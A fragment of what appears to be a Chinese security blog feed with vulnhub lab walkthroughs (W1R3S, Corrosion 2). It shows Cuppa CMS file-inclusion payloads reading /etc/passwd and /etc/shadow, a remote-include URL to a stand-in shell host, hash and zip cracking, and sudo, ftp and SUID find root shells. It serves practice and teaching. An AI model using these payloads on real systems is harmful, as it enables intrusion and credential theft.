href="https://blog.csdn.net/qq_38526635/article/details/82147980">FTP常见命令详解_luckycyong的博客-CSDN博客</a></p></blockquote><p>ftp 存在匿名登陆（用户名anonymous，密码为空）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ftp 192.168.135.145</span><br></code></pre></td></tr></table></figure><p>下载整个ftp目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget ftp://192.168.135.145/* --ftp-user=anonymous --ftp-password= -r</span> <br></code></pre></td></tr></table></figure><p>没有发现什么可用的信息。</p><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh 192.168.135.145</span><br>----------------------<br>Think this is the way?<br>----------------------<br>Well,........possibly.<br>----------------------<br>kali@192.168.135.145&#x27;s password: <br></code></pre></td></tr></table></figure><p><strong>3306端口</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> mysql -h 192.168.135.145 -P 3306 -uroot -p</span><br>Enter password: <br>ERROR 1130 (HY000): Host &#x27;192.168.135.141&#x27; is not allowed to connect to this MySQL server<br></code></pre></td></tr></table></figure><p><strong>80端口</strong></p><p>dirb 爆破目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.145:80</span><br></code></pre></td></tr></table></figure><p>找到了几个重要的目录：/administrator 和 /wordpress 。</p><p>先访问 <a href="http://192.168.135.145/administrator，发现这个是">http://192.168.135.145/administrator，发现这个是</a> Cuppa CMS 的安装设置，猜测可能已经安装了 Cuppa CMS 。</p><p>再访问 <a href="http://192.168.135.145/wordpress，发现打不开，直接">http://192.168.135.145/wordpress，发现打不开，直接</a> wpscan 扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.145/wordpress</span><br>Scan Aborted: The URL supplied redirects to http://localhost/wordpress/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://localhost/wordpress/</span><br>Scan Aborted: The url supplied &#x27;http://localhost/wordpress/&#x27; seems to be down (Couldn&#x27;t connect to server)<br></code></pre></td></tr></table></figure><p>发现是个重定向，重定向到了本地，修改 hosts 文件后仍无法进行扫描 。</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>查找 Cuppa 漏洞脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit Cuppa</span><br>--------------------------------------------------------------------------------- --------------------------<br> Exploit Title                                                                   |  Path<br>--------------------------------------------------------------------------------- --------------------------<br>Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                  | php/webapps/25971.txt<br>--------------------------------------------------------------------------------- --------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>查看该文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br></code></pre></td></tr></table></figure><p>得到两个 payload：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">#####################################################<br>EXPLOIT<br>#####################################################<br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></code></pre></td></tr></table></figure><p>发现该 CMS 存在一个本地/远程文件包含的漏洞。</p><p>经过尝试，发现关闭了远程文件包含，只能进行本地文件包含，所以，尝试得到用户名密码后进行解密。</p><h3 id="M1、burp"><a href="#M1、burp" class="headerlink" title="M1、burp"></a>M1、burp</h3><p>直接浏览器访问，读取 <code>/etc/passwd</code> 文件：</p><p><a href="http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>显示不存在，考虑到扫到的目录为 administrator ，所以对 payload 进行如下修改：</p><p><a href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>再次访问，虽成功访问，但没有内容显示。</p><p>用 burp 抓包，将 GET 方式改成 POST 方式，进行尝试，成功得到 <strong><code>username:w1r3s</code></strong></p><p>同样的方法读取 <code>/etc/shadow</code> ：</p><p><a href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow</a></p><p>得到用户 <code>w1r3s</code> 的 <code>salt 密码</code> ，用 <code>john</code> 破解此密码，得到<strong><code>password:computer</code></strong></p><p>ssh 登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh w1r3s@192.168.135.145</span><br><br>w1r3s@W1R3S:~$ whoami<br>\w1r3s<br>w1r3s@W1R3S:~$ id<br>uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure><h3 id="M2、Curl"><a href="#M2、Curl" class="headerlink" title="M2、Curl"></a>M2、Curl</h3><blockquote><p>Curl详解：<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南 - 阮一峰 (ruanyifeng.com)</a></p></blockquote><p>使用 curl 来利用 LFI 漏洞获取 <code>/etc/password</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/passwd&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash<br></code></pre></td></tr></table></figure><p>找到了一个用户 <code>w1r3s</code> ，然后同样的方法读取 <code>/etc/shadow</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/shadow&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::<br></code></pre></td></tr></table></figure><p>找到了用户 <code>w1r3s</code> 的 <code>salt 密码</code> ，将密码复制到 <code>1.txt</code> 文件中，用 <code>john</code> 破解此密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span><br>w1r3s:computer:17567:0:99999:7:::1 password hash cracked, 0 left<br></code></pre></td></tr></table></figure><p><strong>shadow 文件解析：</strong></p><p>文件的格式为：{用户名}：{加密后的口令密码}：{口令最后修改时间距原点(1970-1-1)的天数}：{口令最小修改间隔(防止修改口令，如果时限未到，将恢复至旧口令)：{口令最大修改间隔}：{口令失效前的警告天数}：{账户不活动天数}：{账号失效天数}：{保留}</p><blockquote><p>其中{加密后的口令密码}的格式为：$id$salt$encrypted</p><ul><li>id为1时，采用md5算法加密</li><li>id为5时，采用SHA256算法加密</li><li>id为6时，采用SHA512算法加密</li><li>salt为盐值，是对密码进行hash的一个干扰值</li><li>encrypted为散列值</li></ul></blockquote><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="M1：直接提权"><a href="#M1：直接提权" class="headerlink" title="M1：直接提权"></a>M1：直接提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">w1r3s@W1R3S:~$ sudo -l<br>[sudo] password for w1r3s: <br>Matching Defaults entries for w1r3s on W1R3S:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User w1r3s may run the following commands on W1R3S:<br>    (ALL : ALL) ALL<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 直接重置 root 密码或者直接 sudo 就能拿到 root</span><br><span class="hljs-meta">#</span><span class="bash"> 由于 ubtun 系统默认是没有激活 root 用户的，需要管理员手工进行操作 sudo passwd 或者 sudo passwd root</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 或者 sudo -i 直接无密码进入 root</span><br>w1r3s@W1R3S:~$ sudo -i<br>root@W1R3S:~# logout<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 或者 sudo su 直接无密码进入 root</span><br>w1r3s@W1R3S:~$ sudo su<br>root@W1R3S:/home/w1r3s# exit<br><br></code></pre></td></tr></table></figure><h3 id="M2：ftp提权"><a href="#M2：ftp提权" class="headerlink" title="M2：ftp提权"></a>M2：ftp提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">w1r3s@W1R3S:~$ sudo ftp<br><span class="hljs-meta">ftp&gt;</span><span class="bash"> !/bin/bash</span><br>root@W1R3S:~# whoami<br>root<br>root@W1R3S:~# id<br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><h3 id="M3：内核提权"><a href="#M3：内核提权" class="headerlink" title="M3：内核提权"></a>M3：内核提权</h3><p>略</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、ftp：信息泄露</p><p>2、web cms：shell、内核漏洞、提权（成熟）</p><p>3、Linux john：密码破解、在线、kali还有</p><p>4、提权：</p><p><strong>mysql:UDF</strong></p><p><strong>core</strong></p><p><strong>sudo</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>[sudo] password for kali: <br>Matching Defaults entries for kali on kali:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User kali may run the following commands on kali:<br>    (ALL : ALL) ALL<br>    # (root) NOPASSWD: /usr/bin/python3<br>    # (root) NOPASSWD: /usr/bin/python3 /home/kali/a.out<br></code></pre></td></tr></table></figure><p><strong>SUID</strong></p><p><strong>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查找具有root权限的SUID的文件</span><br><span class="hljs-meta">#</span><span class="bash"> 可以看到find命令具有SUID权限，如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</span><br><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>......<br>/usr/bin/find<br><span class="hljs-meta">#</span><span class="bash"> /home/kali/b.out</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls -al /usr/bin/find</span><br>ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 查找根目录下名为 thefinalflag.txt 的文件并执行 shell</span><br><span class="hljs-meta">#</span><span class="bash"> -<span class="hljs-built_in">exec</span> 参数后面跟的是<span class="hljs-built_in">command</span>命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。</span><br><span class="hljs-meta">$</span><span class="bash"> find / -name thefinalflag.txt -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;</span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)<br></code></pre></td></tr></table></figure><p><strong>root程序（agent）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -user root -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>......<br>/home/kali/b.out<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ /usr/local/bin/agent;<br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : <br>www-data@imf:/var/www/html/imfadministrator/uploads $ ls -al /usr/local/bin/agent<br>-rwxr-xr-x 1 root root 11896 Oct 12  2016 /usr/local/bin/agent<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ps -aux | grep agent<br>root      1332  0.0  0.0   2188   480 ?        Ss   20:35   0:00 agent<br>www-data  1397  0.0  0.0   4500   852 ?        S    20:41   0:00 sh -c ps -aux | grep agent 2&gt;&amp;1<br>www-data  1399  0.0  0.1  11280  1028 ?        S    20:41   0:00 grep agent<br>www-data@imf:/var/www/html/imfadministrator/uploads $ ps -aux | grep agent<br>www-data  1423  0.0  0.0   2188   544 ?        S    20:44   0:00 /usr/local/bin/agent<br>www-data  1434  0.0  0.0   4500   848 ?        S    20:44   0:00 sh -c ps -aux | grep agent 2&gt;&amp;1<br>www-data  1436  0.0  0.0  11280   924 ?        S    20:44   0:00 grep agent<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Corrosion：2</title>
    <link href="/2022/06/30/Penetration/Vulnhub/Part-1/0x0E%20Corrosion-2/"/>
    <url>/2022/06/30/Penetration/Vulnhub/Part-1/0x0E%20Corrosion-2/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0E-Corrosion-2-vulnhub"><a href="#0x0E-Corrosion-2-vulnhub" class="headerlink" title="0x0E Corrosion: 2~vulnhub"></a>0x0E Corrosion: 2~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/corrosion-2,745/">Corrosion: 2 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.150</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.150</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.150</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-30 04:13 EDT<br>Nmap scan report for 192.168.135.150<br>Host is up (0.00038s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)<br>|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)<br>|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>8080/tcp open  http    Apache Tomcat 9.0.53<br>|_http-favicon: Apache Tomcat<br>|_http-title: Apache Tomcat/9.0.53<br>MAC Address: 00:0C:29:B4:39:BC (VMware)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.38 ms 192.168.135.150<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds <br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.41 ((Ubuntu))</td></tr><tr><td>8080/tcp</td><td>open</td><td>http</td><td>Apache Tomcat 9.0.53</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p><p><strong>80端口</strong></p><p>进行目录扫描无果 。</p><p><strong>8080端口</strong></p><p>进行目录扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.150:8080</span><br><br>Target: http://192.168.135.150:8080/<br><br>[05:01:04] Starting:                            <br>[05:01:31] 200 -   33KB - /backup.zip                                       <br>[05:01:39] 200 -   15KB - /docs/                                                                           <br>[05:01:40] 200 -    1KB - /examples/                                        <br>[05:01:40] 200 -    6KB - /examples/servlets/index.html  <br>[05:01:41] 200 -   21KB - /favicon.ico                                      <br>[05:01:42] 200 -  686B  - /examples/jsp/snp/snoop.jsp<br>[05:01:45] 200 -   11KB - /index.jsp                               <br>[05:01:45] 401 -    2KB - /manager/html<br>[05:02:00] 200 -  153B  - /readme.txt  <br><br>Task Completed     <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.150:8080/ -X .php,.jsp,.zip,.txt</span><br><br>URL_BASE: http://192.168.135.150:8080/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>EXTENSIONS_LIST: (.php,.jsp,.zip,.txt) | (.php)(.jsp)(.zip)(.txt) [NUM = 4]<br><br>---- Scanning URL: http://192.168.135.150:8080/ ----<br>+ http://192.168.135.150:8080/backup.zip (CODE:200|SIZE:33723)<br>+ http://192.168.135.150:8080/index.jsp (CODE:200|SIZE:11136)<br>+ http://192.168.135.150:8080/readme.txt (CODE:200|SIZE:153)   <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.150:8080</span>                           <br>- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.135.150<br>+ Target Hostname:    192.168.135.150<br>+ Target Port:        8080<br>+ Start Time:         2022-07-01 03:47:20 (GMT-4)<br>---------------------------------------------------------------------------<br>+ OSVDB-39272: <br>+ /backup.zip: Potentially interesting archive/cert file found.<br>+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).<br>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS <br>+ OSVDB-397: HTTP method (&#x27;Allow&#x27; Header): &#x27;PUT&#x27; method could allow clients to save files on the web server.<br>+ OSVDB-5646: HTTP method (&#x27;Allow&#x27; Header): &#x27;DELETE&#x27; may allow clients to remove files on the web server.<br>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.<br>+ OSVDB-3092: /readme.txt: This might be interesting...<br>+ /manager/html: Default Tomcat Manager / Host Manager interface found<br>+ /host-manager/html: Default Tomcat Manager / Host Manager interface found<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure><p>得到两个重要文件：<code>/backup.zip</code> 和 <code>/readme.txt</code></p><p>访问 <code>http://192.168.135.150:8080/readme.txt</code> ，得到提示：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Hey randy! It<span class="hljs-comment">&#x27;s your System Administrator. I left you a file on the server, I&#x27;m sure nobody will find it.</span><br>Also remember <span class="hljs-keyword">to</span> use that password I gave you.<br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.135.150:8080/backup.zip</code> ，下载下来一个压缩包，是配置信息，但需要密码，对压缩包进行破解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.150:8080/backup.zip</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> John</span><br><span class="hljs-meta">$</span><span class="bash"> zip2john backup.zip &gt; passwd.txt; john passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br>[......]<br>@administrator_hi5 (backup.zip)<br>[......]<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> fcrackzip/rarcrack/Python(zipfile)</span><br><span class="hljs-meta">$</span><span class="bash"> fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip</span><br></code></pre></td></tr></table></figure><p>解压文件，对文件进行查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip -P @administrator_hi5 -q backup.zip -d ./backup</span><br></code></pre></td></tr></table></figure><p>在 <code>tomcat-users.xml</code> 中找到两个用户名和密码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tomcat-users</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;manager&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;melehifokivai&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">&quot;admin-gui&quot;</span>/&gt;</span><br><span 